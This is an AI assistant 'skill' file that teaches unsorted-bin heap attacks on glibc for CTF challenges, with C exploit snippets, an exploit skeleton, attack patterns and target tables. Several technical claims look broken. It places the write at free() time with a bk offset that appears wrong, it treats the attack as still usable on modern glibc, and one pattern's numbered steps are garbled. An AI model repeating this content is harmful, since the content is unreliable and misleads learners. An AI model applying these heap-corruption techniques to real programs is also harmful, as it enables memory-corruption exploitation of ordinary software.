---
name: unsorted-bin-attack
description: How to perform unsorted bin heap attacks in glibc-based CTF challenges. Use this skill whenever the user mentions heap exploitation, unsorted bins, glibc malloc attacks, chunk corruption, arbitrary writes via heap, or needs to bypass tcache for heap attacks. Also trigger when users discuss global_max_fast manipulation, heap infoleaks, or transitioning from unsorted bin to fast bin attacks.
---

# Unsorted Bin Attack Skill

This skill helps you perform unsorted bin attacks in glibc-based heap exploitation challenges. Unsorted bin attacks allow arbitrary writes by corrupting chunk metadata during free-time insertion into the unsorted bin.

## When to Use This Skill

Use this skill when:
- You have a heap overflow and need an arbitrary write primitive
- You need to leak libc addresses via heap chunks
- You want to manipulate `global_max_fast` (glibc < 2.39) or other global state
- You're transitioning from unsorted bin to fast bin attacks
- You need to bypass tcache for heap exploitation
- The challenge involves glibc malloc/free with controllable chunk sizes

## Core Concept

When a chunk is freed to the unsorted bin, glibc performs:
```
bck = unsorted_chunks(av);
fwd = bck->fd;
victim->bk = bck;
victim->fd = fwd;
fwd->bk = victim;
bck->fd = victim;  // <-- This is the write primitive!
```

If you control `victim->bk` before `free(victim)`, you can make `bck->fd = victim` write to an arbitrary address:
- Set `victim->bk = (mchunkptr)(TARGET - 0x10)`
- Call `free(victim)`
- Result: `*(TARGET) = victim` (arbitrary write!)

## Modern Constraints (glibc ≥ 2.33)

### Tcache Interference
For sizes that fall into tcache, frees go there instead of unsorted bin. Bypass options:

1. **Use large sizes**: Allocate chunks > `MAX_TCACHE_SIZE` (≥ 0x410 on 64-bit)
2. **Fill tcache bin**: Free 7 chunks of the same size first, then free your corrupted chunk
3. **Disable tcache**: Set `GLIBC_TUNABLES=glibc.malloc.tcache_count=0` if environment allows

### Integrity Checks
On allocation from unsorted bin, glibc checks:
- `bck->fd == victim` (your target must hold the victim pointer)
- `victim->fd == unsorted_chunks(av)` (victim's fd must point to arena)

If these fail: `malloc(): unsorted double linked list corrupted`

### Target Selection
- **glibc < 2.39**: `global_max_fast` was a common target (enlarges fastbin limit)
- **glibc ≥ 2.39**: `global_max_fast` is 8-bit; writing a pointer corrupts adjacent data. Use other targets.
- **glibc ≥ 2.34**: `__malloc_hook`/`__free_hook` removed; use GOT/PLT instead
- **General**: Target application globals that treat "large" values as flags/limits

## Minimal Exploitation Recipe

### Step 1: Layout/Grooming
```c
// Allocate chunks large enough to bypass tcache
void *A = malloc(0x5000);  // Overflow source
void *B = malloc(0x5000);  // Chunk to corrupt
void *C = malloc(0x5000);  // Prevent top chunk consolidation
```

### Step 2: Corruption
```c
// Overflow from A into B's metadata
// B's chunk header is at (char*)B - 0x10 (size) - 0x8 (prev_size)
// bk is at offset 0x10 from chunk start (after size, prev_size)
*(size_t *)((char*)B - 0x8) = (size_t)(TARGET - 0x10);
```

### Step 3: Trigger
```c
free(B);  // Triggers *(TARGET) = B
```

### Step 4: Continuation
If you continue allocating:
- The allocator will later set `*(TARGET) = unsorted_chunks(av)`
- Both values are typically large heap/libc addresses
- This may be sufficient for targets checking "big" values

## Attack Patterns

### Pattern 1: Arbitrary Write to Global
Use when you need to set a global variable to a large value.

```
1. Allocate A, B, C (large sizes, bypass tcache)
2. Overflow A → B's bk pointer: B->bk = (GLOBAL - 0x10)
3. free(B)
4. Result: *(GLOBAL) = B (large heap address)
```

### Pattern 2: Libc Infoleak
Use when you need libc addresses for ROP/one-gadget.

```
1. Allocate A, B, C, D (D prevents top consolidation)
2. free(B) → B goes to unsorted bin
3. B's fd/bk now point to main arena
4. Use-after-free or reallocate B without overwriting fd/bk
5. Read B's metadata to leak libc address
```

### Pattern 3: Unsorted → Fast Bin Transition
Use when you need fast bin attacks but glibc uses unsorted bins.

```
1. Perform unsorted bin attack on global_max_fast (glibc < 2.39)
2. Set global_max_fast to large value (e.g., 0x5000)
3. Now small allocations go to fast bins
4. Perform fast bin attack (fd overwrite, etc.)
```

### Pattern 4: Tcache Fill + Unsorted
Use when you can't allocate large chunks.

```
1. Allocate 7 chunks of size X (fills tcache bin)
8. Allocate 8th chunk of size X (goes to unsorted bin)
9. Corrupt 8th chunk's bk pointer
10. free(8th chunk) → unsorted bin write primitive
```

## Common Targets

| Target | glibc Version | Purpose |
|--------|---------------|----------|
| `global_max_fast` | < 2.39 | Enlarge fastbin limit |
| Application globals | Any | Set flags/limits |
| GOT entries | Any | Function pointer hijack |
| Heap metadata | Any | Chunk size manipulation |
| Arena fields | Any | Allocator state corruption |

## Debugging Tips

### Check if chunk goes to unsorted bin
```python
# In gdb with heap debugging
info heap
# Look for "unsorted" in the bin listing
```

### Verify tcache bypass
```python
# Check tcache count
p *(unsigned int*)(0x7ffff7a00000 + 0x10)  # Approximate tcache location
# Or use GLIBC_TUNABLES to disable and test
```

### Common errors
- `malloc(): unsorted double linked list corrupted` → fd/bk integrity check failed
- `malloc(): memory corruption` → Chunk size or alignment issue
- `free(): invalid pointer` → Chunk not properly aligned or marked

## Example: Complete Exploit Skeleton

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define CHUNK_SIZE 0x5000
#define TARGET &some_global_variable

void exploit() {
    void *chunk_a = malloc(CHUNK_SIZE);
    void *chunk_b = malloc(CHUNK_SIZE);
    void *chunk_c = malloc(CHUNK_SIZE);
    
    // Overflow from A into B's metadata
    // B's bk is at offset 0x10 from chunk start
    size_t *bk_ptr = (size_t *)((char*)chunk_b - 0x8);
    *bk_ptr = (size_t)((char*)TARGET - 0x10);
    
    // Trigger the write
    free(chunk_b);
    
    // Now *(TARGET) = chunk_b (a large heap address)
    // Continue with your exploit...
}
```

## References

- [CTF Wiki - Unsorted Bin Attack](https://ctf-wiki.mahaloz.re/pwn/linux/glibc-heap/unsorted_bin_attack/)
- [guyinatuxedo - Unsorted Bin Attack](https://guyinatuxedo.github.io/31-unsortedbin_attack/)
- [glibc 2.33 malloc.c](https://elixir.bootlin.com/glibc/glibc-2.33/source/malloc/malloc.c)
- [glibc 2.39 malloc.c](https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c)

## Related Skills

- `fast-bin-attack` - For fast bin heap exploitation
- `large-bin-attack` - For large bin heap exploitation
- `heap-infoleak` - For leaking libc addresses via heap
- `tcache-attack` - For tcache-based heap exploitation
